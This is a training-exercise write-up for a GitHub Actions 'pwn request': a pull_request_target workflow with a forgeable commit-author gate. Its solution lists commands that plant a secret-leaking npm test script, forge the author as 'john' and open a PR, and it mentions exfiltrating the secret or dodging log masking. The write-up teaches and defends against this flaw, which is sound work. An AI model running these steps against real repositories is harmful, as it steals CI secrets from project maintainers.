# Level 2 - Pwn request through a forgeable commit-author gate

## Description

The goal is to recover the `FLAG` secret, whose value starts with `HS2_`.

The CI workflow (`.github/workflows/ci.yml`) runs on `pull_request_target`, so
it executes in the **base-repo context** (with the repo secrets, including
`FLAG`) while checking out the **untrusted PR head**:

```yaml
- uses: actions/checkout@v4
  with:
    allow-unsafe-pr-checkout: true
    ref: ${{ github.event.pull_request.head.sha }}
```

It then tries to restrict execution to a trusted committer:

```yaml
author=$(git log -1 --format='%an')
if [ "$author" != "john" ]; then exit 1; fi
```

A commit's author name is fully attacker-controlled (`git commit --author=...`),
so this gate is not a real authorization control. Once it passes, `npm install`
/ `npm test` runs attacker-controlled code with `FLAG` in the environment.

The checkout opt-in is deliberate: current versions of `actions/checkout`
otherwise block this privileged fork checkout. It keeps this isolated
training exercise exploitable. In a real project, run untrusted PR code
with `pull_request`, a read-only token, and no secrets; keep privileged
automation separate.

## Solution

1. Fork the level:

   ```bash
   gh repo fork --clone --default-branch-only '<ORG>/level-2_<trainee>'
   ```

2. Plant a payload in code that runs during `npm install` / `npm test` — e.g.
   set the `test` script to exfiltrate `FLAG`:

   ```bash
   jq '.scripts.test |= "node -e \"console.log(process.env.FLAG)\""' package.json | sponge package.json
   ```

   (Send it to an exfil host you control, or print it transformed to dodge log
   masking.)

3. Forge the commit author so the gate passes, then push and open a PR:

   ```bash
   git commit -am "update" --author="john <john@foo.abc>"
   git push
   gh pr create --draft -t 'Pwn Request' -b 'foo'
   ```

The CI run on the base repo checks out your commit, sees author `john`, and runs
your payload with access to `FLAG`.

## Defensive exercise

Do not authorize execution from commit author or committer metadata. Separate untrusted tests from privileged jobs and rerun both the ordinary-author and forged-author PRs.
